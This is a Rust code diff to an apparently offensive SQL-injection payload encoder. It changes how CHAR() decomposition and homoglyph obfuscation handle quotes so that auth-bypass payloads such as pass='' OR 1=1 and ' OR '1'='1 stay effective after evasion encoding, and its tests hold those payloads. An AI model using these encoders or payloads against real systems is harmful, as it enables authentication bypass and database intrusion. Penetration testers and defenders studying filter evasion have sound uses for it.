@@ -319,9 +319,11 @@ pub fn sql_concat_split(payload: &str) -> String {
 /// sibling `chr_decompose` could ship later.
 ///
 /// **Edge cases**:
-/// - Empty literals (`''`) become `CHAR()` — valid MySQL syntax that
-///   evaluates to NULL. May not be what the operator wanted; treat as a
-///   neutral marker.
+/// - Empty literals (`''`) pass through as `''` unchanged. `CHAR()`
+///   with zero args evaluates to NULL in MySQL — silently flipping
+///   a comparison like `pass='' OR 1=1` into `pass=NULL OR 1=1`
+///   would break the auth bypass (`= NULL` is never TRUE). Preserve
+///   the empty-string identity.
 /// - Multi-byte UTF-8 chars produce a single `CHAR(codepoint)` per
 ///   `chars()` iteration — for codepoints > 255, MySQL's CHAR() returns
 ///   per-byte; the codepoint may not round-trip exactly. Most SQLi
@@ -353,6 +355,16 @@ pub fn sql_char_decompose(payload: &str) -> String {
         if !closed {
             out.push('\'');
             out.push_str(&literal);
+            continue;
+        }
+        // Empty literal: pass through as-is. CHAR() with zero
+        // arguments evaluates to NULL in MySQL, not the empty
+        // string. Auth-bypass payloads using `''` (e.g.
+        // `pass='' OR 1=1`) would silently flip the comparison
+        // to NULL — `WHERE pass=NULL` is never TRUE, so the
+        // bypass fails. Preserve the empty-string identity.
+        if literal.is_empty() {
+            out.push_str("''");
             continue;
         }
         out.push_str("CHAR(");
@@ -587,9 +599,19 @@ pub fn homoglyph_encode(payload: &str) -> String {
     let mut out = String::with_capacity(payload.len() * 4);
     for ch in payload.chars() {
         let mapped = match ch {
-            // Quotes and delimiters
-            '\'' => '\u{2019}', // RIGHT SINGLE QUOTATION MARK (')
-            '"' => '\u{201D}',  // RIGHT DOUBLE QUOTATION MARK (")
+            // INTENTIONALLY NOT REPLACED — SQL string delimiters.
+            // Pre-fix `'` → U+2019 and `"` → U+201D were mapped to
+            // their right-single/double quotation marks. Those
+            // codepoints are NOT recognised as string delimiters
+            // by ANY SQL parser — they're treated as word
+            // characters. The host query's string literal is never
+            // closed, the injection context-break disappears, and
+            // the payload becomes inert. Modern frameworks rarely
+            // NFKC-normalise BEFORE the SQL parser sees the bytes,
+            // so the assumption that this trick survives was wrong
+            // in practice. Keep `'` and `"` ASCII; mutate only the
+            // non-delimiter punctuation below.
+            //
             // Comparison operators
             '<' => '\u{FF1C}', // FULLWIDTH LESS-THAN SIGN (＜)
             '>' => '\u{FF1E}', // FULLWIDTH GREATER-THAN SIGN (＞)
@@ -600,7 +622,7 @@ pub fn homoglyph_encode(payload: &str) -> String {
             ';' => '\u{FF1B}', // FULLWIDTH SEMICOLON (；)
             '-' => '\u{2010}', // HYPHEN (‐)
             '/' => '\u{2215}', // DIVISION SLASH (∕)
-            // Keep letters and digits unchanged for readability
+            // Keep letters, digits, and delimiters unchanged.
             c => c,
         };
         out.push(mapped);
@@ -1081,9 +1103,22 @@ mod tests {
     }
 
     #[test]
-    fn sql_char_decompose_empty_literal() {
-        assert_eq!(sql_char_decompose("''"), "CHAR()");
+    fn sql_char_decompose_empty_literal_preserves_empty_string() {
+        // F60 regression: pre-fix `''` produced `CHAR()` which is
+        // NULL in MySQL — breaking `pass='' OR 1=1` auth bypass
+        // (`= NULL` is never TRUE). Post-fix the empty literal
+        // round-trips unchanged.
+        assert_eq!(sql_char_decompose("''"), "''");
+        // Embedded in a longer payload too.
+        assert_eq!(
+            sql_char_decompose("WHERE pass='' OR 1=1"),
+            "WHERE pass='' OR 1=1"
+        );
     }
+
+    // sql_char_decompose_empty_literal_preserves_empty_string above
+    // supersedes the pre-fix test that asserted CHAR() — kept as a
+    // marker rather than re-asserting the buggy old contract.
 
     #[test]
     fn sql_char_decompose_unbalanced_passthrough() {
@@ -1209,15 +1244,40 @@ mod tests {
     // ── Homoglyph encoding tests ───────────────────────────────────────
 
     #[test]
-    fn homoglyph_replaces_quotes() {
+    fn homoglyph_preserves_sql_string_delimiters() {
+        // Regression for F56: pre-fix `'` was mapped to U+2019,
+        // destroying the SQL context-break the payload depends on.
+        // U+2019 is not a SQL string delimiter — the host query's
+        // string literal never closes and the injection becomes
+        // inert. Verify the delimiters survive verbatim.
         let encoded = homoglyph_encode("' OR '1'='1");
+        // Single + double quotes pass through unchanged.
         assert!(
-            !encoded.contains('\''),
-            "ASCII single quote should be replaced"
+            encoded.contains('\''),
+            "ASCII single quote MUST be preserved for SQL: {encoded}"
         );
         assert!(
-            encoded.contains('\u{2019}'),
-            "should contain RIGHT SINGLE QUOTATION MARK"
+            !encoded.contains('\u{2019}'),
+            "U+2019 right-single-quote must NOT appear: {encoded}"
+        );
+        // But the equals sign (non-delimiter) still gets mutated —
+        // proves the function isn't a complete no-op.
+        assert!(
+            encoded.contains('\u{FF1D}'),
+            "equals sign should still mutate to fullwidth: {encoded}"
+        );
+    }
+
+    #[test]
+    fn homoglyph_preserves_ascii_double_quote() {
+        let encoded = homoglyph_encode(r#""admin" OR "1"="1""#);
+        assert!(
+            encoded.contains('"'),
+            "ASCII double quote MUST be preserved: {encoded}"
+        );
+        assert!(
+            !encoded.contains('\u{201D}'),
+            "U+201D right-double-quote must NOT appear: {encoded}"
         );
     }
 
